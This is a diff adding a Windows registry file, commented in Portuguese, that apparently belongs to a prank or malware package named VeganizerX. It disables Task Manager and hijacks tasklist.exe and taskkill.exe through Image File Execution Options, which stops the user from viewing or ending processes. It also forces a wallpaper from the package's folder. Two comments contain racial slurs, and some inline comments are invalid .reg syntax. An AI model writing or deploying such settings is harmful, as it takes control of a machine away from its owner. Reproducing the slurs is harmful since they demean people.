@@ -1,0 +1,23 @@
+Windows Registry Editor Version 5.00
+
+; Bloquear o Gerenciador de Tarefas
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableTaskMgr"=dword:00000001
+
+; Definir permissões para bloquear o tasklist.exe e taskkill.exe
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe]
+"Debugger"="msg * Ação bloqueada! Você não tem permissão para usar o comando tasklist."
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe]
+"Debugger"="msg * Ação bloqueada! Você não tem permissão para usar o comando taskkill."
+
+; Definir o wallpapercunigga
+[HKEY_CURRENT_USER\Control Panel\Desktop]
+"Wallpaper"="C:\VeganizerX\wallpaper.png"
+"WallpaperStyle"="2"  ; 2 para esticar
+"TileWallpaper"="0"   ; 0 para não repetir
+
+; Forçar a atualização niggerpaper
+[HKEY_CURRENT_USER\Control Panel\Desktop]
+"WallpaperStyle"="2"
+"TileWallpaper"="0"
